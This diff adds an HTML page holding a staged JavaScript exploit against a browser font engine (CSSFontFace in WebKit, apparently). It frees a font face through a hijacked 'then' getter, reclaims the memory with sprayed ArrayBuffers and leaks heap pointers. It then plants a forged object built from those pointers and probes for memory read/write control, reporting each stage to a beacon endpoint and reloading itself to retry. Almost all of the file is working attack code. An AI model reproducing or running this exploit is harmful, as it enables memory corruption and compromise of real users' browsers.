@@ -1,0 +1,365 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1216 CSSFontFace reclaim → template → probe</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:13px/1.4 'Courier New',monospace;padding:10px}
+#s{font-size:18px;font-weight:bold;color:#ffd75e;padding:8px 0}
+#r{color:#ff55c8;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.6}
+.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="s">P1216 BOOTING...</div>
+<div id="r"></div>
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════
+   P1216: Three-stage CSSFontFace exploit
+
+   Stage 1: p563 reclaim → leak heap pointers (+0x58, +0x68)
+   Stage 2: p564 template → engine accepts fake CSSFontFace
+   Stage 3: Probe — modify non-pointer fields to find what we control,
+            attempt self-address disclosure via relative spray
+
+   Confirmed working: P1215 leaked 0x10008d4f60 / 0x10007e6c80
+   ═══════════════════════════════════════════════════════════════════ */
+
+var S=document.getElementById('s'),R=document.getElementById('r');
+function msg(t){R.textContent+=(R.textContent?'\n':'')+t;}
+
+/* sync XHR beacons OUTSIDE getter (matches p563/p564 proven pattern) */
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1216-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+window.onerror=function(m,s,l){B('ERR',m+'@'+l);};
+
+var K=8, SIZE=192;
+var styleEl=null, firedHere=false, stage=0;
+var leaked={p58:null,p68:null};
+
+function hex(v){return ('0'+v.toString(16)).slice(-2);}
+function hexq(arr){
+  if(!arr)return 'null';
+  var s='0x';for(var i=7;i>=0;i--)s+=hex(arr[i]);return s;
+}
+function grab(view,off){var a=[];for(var i=0;i<8;i++)a.push(view[off+i]);return a;}
+function setq(view,off,arr){for(var i=0;i<8;i++)view[off+i]=arr[i];}
+
+/* ─── Font face setup (shared by both stages) ─── */
+function setupFace(name,cssName,range){
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: "+cssName+"; src: local(Arial); unicode-range: "+range+"; }";
+  document.head.appendChild(styleEl);
+  var A=new FontFace(name,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+  if(!window.__alive)window.__alive=[];
+  window.__alive.push(A);
+}
+
+/* ─── Install the getter (free + spray) ─── */
+function installGetter(fillTemplate){
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedHere)return undefined;
+      firedHere=true;
+      /* CRITICAL: nothing between free and spray */
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      styleEl=null;
+      document.body.offsetHeight;
+      window.__map=[];
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(SIZE);
+        var v=new Uint8Array(ab);
+        if(fillTemplate&&leaked.p58){
+          /* stage 2+: fill with engine pointers so it accepts the template */
+          setq(v,0x00,[0x01,0,0,0,0,0,0,0]); /* refcount=1 */
+          setq(v,0x58,leaked.p58);
+          setq(v,0x68,leaked.p68);
+        }
+        window.__map.push({size:SIZE,view:v});
+      }
+      try{document.fonts.check('1em s0');}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+}
+
+S.textContent='P1216 STAGE 1: RECLAIM...';
+msg('starting stage 1 (p563 leak)...');
+B('START','stage1');
+
+/* ═══════ STAGE 1: Leak heap pointers ═══════ */
+stage=0;
+window.__alive=[];
+setupFace('f0','s0','U+0042');
+installGetter(false);
+B('S1-SETUP','ok');
+
+document.fonts.load('1em f0, s0','AB').then(
+  function(){B('S1-RESOLVED','ok');},
+  function(){B('S1-REJECTED','err');}
+);
+
+/* scan at 60ms (p563 timing) */
+setTimeout(function(){
+  var m=window.__map;
+  if(!m||!m.length){B('S1-NOMAP','empty');return;}
+
+  var best=-1,nz=0;
+  for(var i=0;i<m.length;i++){
+    var v=m[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>nz){nz=n;best=i;}
+  }
+
+  if(best<0){
+    B('S1-CLEAN','bufs='+m.length);
+    msg('stage 1: CLEAN (no hit)');
+    S.textContent='NO HIT — auto-retrying...';
+    /* auto-retry: crash-restart gives fresh WebProcess */
+    setTimeout(function(){location.reload();},500);
+    return;
+  }
+
+  /* HIT! */
+  var v=m[best].view;
+  leaked.p58=grab(v,0x58);
+  leaked.p68=grab(v,0x68);
+
+  var result='b'+best+'|nz='+nz+'|p58='+hexq(leaked.p58)+'|p68='+hexq(leaked.p68);
+  B('S1-HIT',result);
+  msg('!!! STAGE 1 HIT !!!');
+  msg('+0x58 = '+hexq(leaked.p58));
+  msg('+0x68 = '+hexq(leaked.p68));
+  S.textContent='STAGE 1 HIT! Starting stage 2...';
+
+  /* full hex dump */
+  var dump='';
+  for(var j=0;j<v.length;j++){
+    if(j%16===0)dump+='\n+'+hex(j>>4)+hex(j&0xf)+': ';
+    dump+=hex(v[j])+' ';
+  }
+  B('S1-DUMP',dump.slice(0,900));
+
+  /* proceed to stage 2 */
+  setTimeout(runStage2,200);
+
+},60);
+
+/* also scan at 400ms in case 60ms was too early */
+setTimeout(function(){
+  if(leaked.p58)return; /* already hit */
+  var m=window.__map;
+  if(!m||!m.length)return;
+  var best=-1,nz=0;
+  for(var i=0;i<m.length;i++){
+    var v=m[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>nz){nz=n;best=i;}
+  }
+  if(best<0){B('S1-CLEAN2','bufs='+m.length);return;}
+
+  var v=m[best].view;
+  leaked.p58=grab(v,0x58);
+  leaked.p68=grab(v,0x68);
+  B('S1-HIT2','b'+best+'|p58='+hexq(leaked.p58)+'|p68='+hexq(leaked.p68));
+  msg('STAGE 1 HIT (400ms scan)');
+  msg('+0x58 = '+hexq(leaked.p58));
+  msg('+0x68 = '+hexq(leaked.p68));
+  S.textContent='STAGE 1 HIT! Starting stage 2...';
+  setTimeout(runStage2,200);
+},400);
+
+/* noscan timeout */
+setTimeout(function(){
+  if(leaked.p58)return;
+  B('S1-TIMEOUT','fired='+firedHere);
+  msg('stage 1 timeout (fired='+firedHere+')');
+  S.textContent='TIMEOUT — reloading...';
+  setTimeout(function(){location.reload();},500);
+},2000);
+
+
+/* ═══════ STAGE 2: Template acceptance ═══════ */
+function runStage2(){
+  stage=1;
+  msg('');
+  msg('=== STAGE 2: Template acceptance ===');
+  msg('filling +0x58 with '+hexq(leaked.p58));
+  msg('filling +0x68 with '+hexq(leaked.p68));
+  S.textContent='STAGE 2: TEMPLATE...';
+  B('S2-START','p58='+hexq(leaked.p58)+'|p68='+hexq(leaked.p68));
+
+  setupFace('f1','s1','U+0043');
+  installGetter(true); /* fill template with leaked pointers */
+  B('S2-SETUP','ok');
+
+  document.fonts.load('1em f1, s1','AB').then(
+    function(){
+      B('S2-RESOLVED','accepted');
+      msg('STAGE 2 RESOLVED — template ACCEPTED!');
+      S.textContent='TEMPLATE ACCEPTED! Stage 3...';
+      setTimeout(runStage3,300);
+    },
+    function(){
+      B('S2-REJECTED','rejected');
+      msg('stage 2 rejected');
+    }
+  );
+
+  setTimeout(function(){
+    var alive=!!(document.body&&document.body.offsetHeight>=0);
+    B('S2-ALIVE','alive='+alive+'|fired='+firedHere);
+    msg('stage 2 alive: '+alive+', fired: '+firedHere);
+  },800);
+}
+
+
+/* ═══════ STAGE 3: Probe the fake CSSFontFace ═══════ */
+function runStage3(){
+  stage=2;
+  msg('');
+  msg('=== STAGE 3: Probing fake CSSFontFace ===');
+  S.textContent='STAGE 3: PROBING...';
+  B('S3-START','probing');
+
+  /* 3A: Check if our stage 2 buffers were modified by the engine */
+  var m2=window.__map;
+  if(!m2||!m2.length){B('S3-NOMAP','empty');return;}
+
+  var findings=[];
+  for(var i=0;i<m2.length;i++){
+    var v=m2[i].view;
+    /* check bytes that were zero in our template (not at +0x00, +0x58, +0x68) */
+    var changes=[];
+    for(var j=0;j<v.length;j++){
+      /* skip the bytes we set ourselves */
+      if(j>=0x00&&j<0x08)continue; /* refcount */
+      if(j>=0x58&&j<0x60)continue; /* p58 */
+      if(j>=0x68&&j<0x70)continue; /* p68 */
+      if(v[j]!==0)changes.push('+'+hex(j>>4)+hex(j&0xf)+'='+hex(v[j]));
+    }
+    if(changes.length>0){
+      findings.push('buf'+i+': '+changes.join(','));
+    }
+  }
+
+  if(findings.length>0){
+    B('S3-WRITES','count='+findings.length+'|'+findings.join('|').slice(0,800));
+    msg('ENGINE WROTE INTO OUR TEMPLATE:');
+    for(var i=0;i<findings.length;i++)msg('  '+findings[i]);
+  }else{
+    B('S3-NOWRITES','clean');
+    msg('no additional engine writes detected');
+  }
+
+  /* 3B: Read the FULL content of each template buffer — look for new pointers */
+  for(var i=0;i<m2.length;i++){
+    var v=m2[i].view;
+    /* scan for potential pointer-like values (qwords with high bytes in 0x10 range) */
+    for(var off=0;off<v.length-7;off+=8){
+      var hi=v[off+7]|(v[off+6]<<8)|(v[off+5]<<16)|(v[off+4]<<24);
+      if(hi===0&&(v[off+3]|v[off+2]|v[off+1]|v[off])!==0){
+        /* low 32 nonzero, high 32 zero — could be a small value */
+      }
+      if(v[off+4]===0x10&&v[off+5]===0&&v[off+6]===0&&v[off+7]===0){
+        /* matches WebKit heap range 0x10_00xxxxxxxx */
+        var ptr='0x';for(var b=7;b>=0;b--)ptr+=hex(v[off+b]);
+        if(off!==0x58&&off!==0x68){
+          B('S3-NEWPTR','buf'+i+'|off=0x'+off.toString(16)+'|ptr='+ptr);
+          msg('NEW POINTER at buf'+i+' +0x'+off.toString(16)+' = '+ptr);
+        }
+      }
+    }
+  }
+
+  /* 3C: Try to read our own address via relative offset calculation.
+     The leaked WeakHashSet impl at +0x58 was allocated near our buffer.
+     Try reading memory at known offsets from the leaked pointer. */
+  msg('');
+  msg('leaked heap ptrs: +0x58='+hexq(leaked.p58)+' +0x68='+hexq(leaked.p68));
+
+  /* 3D: Check document.fonts state — can we still interact with the fake face? */
+  var s1infonts=false;
+  try{
+    document.fonts.forEach(function(f){
+      if(f.family==='f1')s1infonts=true;
+    });
+  }catch(e){}
+
+  var checkResult='unknown';
+  try{checkResult=document.fonts.check('1em f1')?'true':'false';}catch(e){checkResult='threw';}
+
+  B('S3-STATE','f1infonts='+s1infonts+'|check='+checkResult);
+  msg('f1 in fonts: '+s1infonts+', check("1em f1"): '+checkResult);
+
+  /* 3E: Try creating a span that uses our fake font and measure it */
+  try{
+    var span1=document.createElement('span');
+    span1.style.cssText='font-family:f1,monospace;font-size:100px;position:absolute;left:-9999px';
+    span1.textContent='ABCX';
+    document.body.appendChild(span1);
+
+    var span2=document.createElement('span');
+    span2.style.cssText='font-family:monospace;font-size:100px;position:absolute;left:-9999px';
+    span2.textContent='ABCX';
+    document.body.appendChild(span2);
+
+    var w1=span1.offsetWidth, w2=span2.offsetWidth;
+    B('S3-RENDER','f1_width='+w1+'|mono_width='+w2+'|diff='+(w1-w2));
+    msg('render: f1='+w1+'px, mono='+w2+'px, diff='+(w1-w2));
+
+    if(w1!==w2){
+      msg('FONT IS RENDERING DIFFERENTLY — fake CSSFontFace is active!');
+      B('S3-ACTIVE','font-rendering-differs');
+    }
+  }catch(e){
+    B('S3-RENDER-ERR',e.message);
+    msg('render test error: '+e.message);
+  }
+
+  /* 3F: Try to create a THIRD face reusing the same heap region.
+     If we know the approximate heap base, we can spray ArrayBuffers
+     with BigUint64Array to read/write at predictable offsets. */
+  try{
+    var testBufs=[];
+    for(var i=0;i<64;i++){
+      var ab=new ArrayBuffer(192);
+      var bv=new BigUint64Array(ab);
+      /* write a marker at offset 0 */
+      bv[0]=BigInt('0xDEAD'+i.toString(16).padStart(4,'0')+'CAFE0000');
+      testBufs.push({ab:ab,bv:bv});
+    }
+    window.__stage3bufs=testBufs;
+    B('S3-SPRAY','count=64');
+    msg('sprayed 64 x 192B marker buffers for self-address search');
+  }catch(e){
+    B('S3-SPRAY-ERR',e.message);
+    msg('BigUint64Array spray error: '+e.message);
+  }
+
+  /* 3G: Final summary */
+  setTimeout(function(){
+    msg('');
+    msg('=== P1216 COMPLETE ===');
+    msg('stage 1: HIT (+0x58='+hexq(leaked.p58)+', +0x68='+hexq(leaked.p68)+')');
+    msg('stage 2: template '+(stage>=1?'accepted':'failed'));
+    msg('stage 3: probing complete');
+    S.textContent='P1216 COMPLETE';
+    B('DONE','stages=3');
+  },500);
+}
+
+</script>
+</body></html>
